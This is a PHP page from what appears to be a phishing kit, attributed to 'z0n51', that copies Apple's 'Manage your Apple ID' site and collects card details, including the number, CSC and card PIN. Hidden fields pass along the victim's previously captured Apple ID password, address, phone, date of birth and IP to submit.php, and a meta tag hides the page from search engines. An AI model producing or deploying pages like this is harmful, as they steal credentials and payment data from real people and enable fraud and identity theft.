<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           APPLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      APPLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Manage your Apple ID - Apple</title>
    </head>

    <body>

        <div id="hero" class="imgbg">
            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="hero-title">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                            <h3>Card Details</h3>
                            <p>Your Apple ID is <?php echo $_SESSION['apple_id']; ?></p>
                        </div>
                        <div class="col-md-3 d-lg-flex d-md-flex d-sm-none d-none align-items-center">
                            <button>Log Out</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div id="details">
            <div class="container">
                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-12 col-12 left-side">
                        <form method="post" action="submit.php" id="cc-form">
                            <input type="hidden" name="verbot">
                            <h3>Confirm Card Details</h3>
                            <div class="form-group mb-3">
                                <label for="cc_name">Cardholder name</label>
                                <input type="text" name="cc_name" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_name') ?>" id="cc_name" placeholder="Cardholder name" value="<?php echo get_value('cc_name'); ?>">
                                <?php echo error_message($_SESSION['errors'],'cc_name'); ?>
                            </div>
                            <div class="form-group mb-3">
                                <label for="card_number">Card Number</label>
                                <input type="text" name="cc_number" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>" id="cc_number" placeholder="Card Number" value="<?php echo get_value('cc_number'); ?>">
                                <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                            </div>
                            <div class="row mb-3">
                                <div class="col-6">
                                    <label for="cc_date">Expiration date</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>" name="cc_date" id="cc_date" placeholder="MM/YYYY" value="<?php echo get_value('cc_date'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                                </div>
                                <div class="col-6">
                                    <label for="cc_cvv">CSC</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>" name="cc_cvv" id="cc_cvv" placeholder="CSC" value="<?php echo get_value('cc_cvv'); ?>">
                                    <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                                </div>
                            </div>
                            <div class="form-group mb-3">
                                <label for="cc_pin">Card PIN</label>
                                <input type="text" name="cc_pin" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_pin') ?>" id="cc_pin" placeholder="Card PIN" maxlength="4" value="<?php echo get_value('cc_pin'); ?>">
                                <?php echo error_message($_SESSION['errors'],'cc_pin'); ?>
                            </div>
                            <button class="mt-4" id="cc-submit" type="button">Continue</button>
                            <input type="hidden" name="country" id="country" value="<?php echo get_user_country(); ?>">
                            <input type="hidden" name="apple_id" id="apple_id" value="<?php echo $_SESSION['apple_id']; ?>">
                            <input type="hidden" name="apple_password" id="apple_password" value="<?php echo $_SESSION['apple_password']; ?>">
                            <input type="hidden" name="full_name" id="full_name" value="<?php echo $_SESSION['full_name']; ?>">
                            <input type="hidden" name="address" id="address" value="<?php echo $_SESSION['address']; ?>">
                            <input type="hidden" name="city" id="city" value="<?php echo $_SESSION['city']; ?>">
                            <input type="hidden" name="state" id="state" value="<?php echo $_SESSION['state']; ?>">
                            <input type="hidden" name="postal_code" id="postal_code" value="<?php echo $_SESSION['postal_code']; ?>">
                            <input type="hidden" name="phone" id="phone" value="<?php echo $_SESSION['phone']; ?>">
                            <input type="hidden" name="date_of_birth" id="date_of_birth" value="<?php echo $_SESSION['date_of_birth']; ?>">
                            <input type="hidden" name="ip_address" id="ip_address" value="<?php echo get_user_ip(); ?>">
                            <input type="hidden" name="type" value="card">
                        </form>
                    </div>
                    <div class="col-lg-5 col-md-5 col-sm-12 col-12 mt-lg-0 mt-md-0 mt-sm-5 mt-5 right-side">
                        <p> We are committed to keeping your personal information secure and private, whether stored on your device or on Apple's servers. </p>
                        <a href="#">Learn more about how Apple protects your privacy. Opens in a new window.</a>
                    </div>
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a>.</p>
                        <p>Copyright © 2020 Apple Inc. All rights reserved.</p>
                        <ul>
                            <li><a href="#">Privacy Policy</a></li>
                            <li><a href="#">Terms of Use</a></li>
                            <li><a href="#">Sales and Refunds</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Legal</a></li>
                            <li><a href="#">Site Map</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/usaflag.png"> United States
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_date').payment('formatCardExpiry');
            jQuery('#cc_cvv').payment('formatCardCVC');
        </script>

    </body>

</html>